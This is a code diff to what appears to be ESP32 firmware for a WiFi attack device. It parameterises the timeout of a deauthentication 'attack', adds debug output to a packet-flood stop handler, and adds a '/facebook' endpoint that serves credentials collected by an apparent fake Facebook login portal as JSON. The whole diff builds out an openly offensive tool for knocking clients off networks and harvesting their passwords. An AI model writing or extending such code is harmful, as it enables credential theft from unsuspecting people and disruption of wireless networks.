@@ -6,6 +6,7 @@
 #include "http_request.h"
 #include "html_pages.h"
 #include "tasks.h"
+#include "facebook_web_server.h"
 
 static wifictl_ap_records_t ap_records = {0};
 
@@ -29,6 +30,14 @@ void handle_attack(http_request_t* req, int client_sock) {
         http_send_bad_request_response(client_sock);
         return;
     }
+    char timeout_str[6];
+    ret = http_request_get_url_param(req->url, "timeout", sizeof(timeout_str), timeout_str);
+    if (ret != 0) {
+        ESP_LOGE("WebServer", "Failed to get timeout from URL");
+        http_send_bad_request_response(client_sock);
+        return;
+    }
+    int timeout = atoi(timeout_str);
     uint8_t bytes_bssid[6];
     ret = bssid_string_to_bytes(bssid, bytes_bssid);
     if(ret != 0) {
@@ -44,7 +53,7 @@ void handle_attack(http_request_t* req, int client_sock) {
         return;
     }
     http_send_ok_response(client_sock);
-    ret = wifi_disconnect(record, 10);
+    ret = wifi_disconnect(record, timeout);
     if (ret != ESP_OK) {
         ESP_LOGE("WebServer", "BSSID not found");
         http_send_error_response(client_sock);
@@ -67,13 +76,28 @@ void handle_flood(http_request_t* req, int client_sock) {
 }
 
 void handle_flood_stop(http_request_t* req, int client_sock) {
+    printf("flood status: %d\n", flood_running);
     if (!flood_running || flood_task_handle == NULL) {
+        printf("Flood not running sending 409\n");
         http_send_conflict_response(client_sock);
         return;
     }
-
+    printf("Flood running 200\n");
     flood_running = false;
     http_send_ok_response(client_sock); // 200
+}
+
+void handle_facebook_data(http_request_t* req, int client_sock) {
+    print_cred_buffer(&cred_buffer);
+    char* json = cred_buffer_to_json(&cred_buffer);
+    if (json == NULL) {
+        ESP_LOGE("WebServer", "Failed to convert credentials to JSON");
+        http_send_error_response(client_sock);
+        return;
+    }
+    printf("facebook json %s\n", json);
+    http_send_json_response(client_sock, json);
+    free(json);
 }
 
 void handle_connection(http_request_t* req, int client_sock) {
@@ -98,6 +122,9 @@ void handle_connection(http_request_t* req, int client_sock) {
     } else if (strcmp(req->url, "/flood/stop") == 0) {
         ESP_LOGI("WebServer", "Handling flood stop request");
         handle_flood_stop(req, client_sock);
+    } else if (strcmp(req->url, "/facebook") == 0) {
+        ESP_LOGI("WebServer", "Handling facebook data request");
+        handle_facebook_data(req, client_sock);
     } else {
         ESP_LOGI("WebServer", "Handling not found request");
         http_send_not_found_response(client_sock);
